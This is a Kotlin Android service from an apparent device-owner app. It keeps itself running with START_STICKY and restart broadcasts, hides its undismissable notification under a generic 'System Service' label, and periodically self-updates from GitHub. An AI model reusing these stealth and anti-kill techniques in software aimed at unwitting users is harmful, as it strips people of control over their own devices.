package com.example.deviceowner.monitoring

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.deviceowner.update.config.UpdateConfig
import com.example.deviceowner.update.github.GitHubUpdateManager
import com.example.deviceowner.receivers.ServiceGuardReceiver
import kotlinx.coroutines.*

/**
 * SecurityMonitorService - Persistent Background Monitoring
 * v7.0 - Anti-Kill Implementation with START_STICKY and Guard Broadcasts.
 */
class SecurityMonitorService : Service() {
    
    companion object {
        private const val TAG = "SecurityMonitor"
        private const val NOTIFICATION_ID = 1002
        private const val CHANNEL_ID = "security_monitor_channel_v2"
        const val EXTRA_DEVICE_ID = "device_id"
        
        fun startService(context: Context, deviceId: String? = null) {
            val intent = Intent(context, SecurityMonitorService::class.java)
            if (!deviceId.isNullOrBlank()) {
                intent.putExtra(EXTRA_DEVICE_ID, deviceId)
            }
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${e.message}")
            }
        }
    }
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var updateJob: Job? = null
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Start as foreground service with a silent but persistent notification
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startAutoUpdateLoop()
        Log.i(TAG, "Security Monitor Service Created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Essential: START_STICKY tells the OS to restart the service if killed
        return START_STICKY
    }

    private fun startAutoUpdateLoop() {
        if (updateJob?.isActive == true) return
        
        val updateManager = GitHubUpdateManager(this)
        updateJob = serviceScope.launch {
            // Initial delay before first check
            delay(10_000L) 
            
            while (isActive) {
                try {
                    updateManager.checkAndUpdate()
                } catch (e: Exception) {
                    Log.e(TAG, "Update check failed: ${e.message}")
                }
                // Check for updates every few hours (configured in UpdateConfig)
                delay(UpdateConfig.UPDATE_CHECK_INTERVAL_SECONDS * 1000L)
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, 
                "System Monitoring", 
                NotificationManager.IMPORTANCE_MIN // Minimizes visibility
            ).apply {
                description = "Background security monitoring"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Monitoring device security")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true) // Cannot be dismissed by user
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    /**
     * If the service is destroyed, send a broadcast to trigger the GuardReceiver
     * which will attempt to restart it.
     */
    override fun onDestroy() {
        Log.w(TAG, "Service is being destroyed! Sending Guard Broadcast...")
        val guardIntent = Intent(this, ServiceGuardReceiver::class.java).apply {
            action = ServiceGuardReceiver.ACTION_GUARD_CHECK
        }
        sendBroadcast(guardIntent)
        
        updateJob?.cancel()
        serviceScope.cancel()
        super.onDestroy()
    }

    /**
     * On task removed (if app is swiped from recents), attempt to stay alive.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.w(TAG, "Task removed! Attempting to persist...")
        super.onTaskRemoved(rootIntent)
    }
}
